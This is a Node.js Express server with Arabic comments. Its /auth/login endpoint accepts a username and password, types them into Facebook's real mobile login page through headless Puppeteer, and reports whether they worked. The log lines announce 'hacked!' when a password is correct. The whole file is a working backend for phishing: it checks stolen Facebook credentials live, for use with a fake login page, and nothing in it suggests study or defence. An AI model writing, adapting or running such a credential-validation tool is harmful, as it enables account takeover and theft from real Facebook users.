const express = require('express');
const puppeteer = require('puppeteer');
const cors = require('cors');

const app = express();
app.use(cors());
app.use(express.json());

app.post('/auth/login', async (req, res) => {
    const { user, pass } = req.body;
    console.log(`[*] استلام محاولة دخول لـ: ${user}`);

    const browser = await puppeteer.launch({ 
        headless: true,
        args: ['--no-sandbox', '--disable-setuid-sandbox'] 
    });
    
    const page = await browser.newPage();

    try {
        await page.goto('https://m.facebook.com/login', { waitUntil: 'networkidle2' });
        
        // إدخال البيانات في فيسبوك الحقيقي
        await page.type('input[name="email"]', user);
        await page.type('input[name="pass"]', pass);
        await page.click('button[name="login"]');
        
        // انتظار النتيجة (هل نجح الدخول أم لا)
        await new Promise(r => setTimeout(r, 4000));

        const currentUrl = page.url();
        
        // إذا لساتنا بصفحة الـ login يعني الباسورد غلط
        if (currentUrl.includes('login')) {
            console.log(`[!] كلمة سر خاطئة لـ: ${user}`);
            res.json({ status: "fail" });
        } else {
            console.log(`[+] تم الاختراق! الباسورد صحيح لـ: ${user}`);
            res.json({ status: "success" });
        }
    } catch (err) {
        res.status(500).json({ error: "Internal Error" });
    } finally {
        await browser.close();
    }
});

const PORT = 3000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`[Server] المحاكي يعمل الآن على المنفذ ${PORT}`);
});
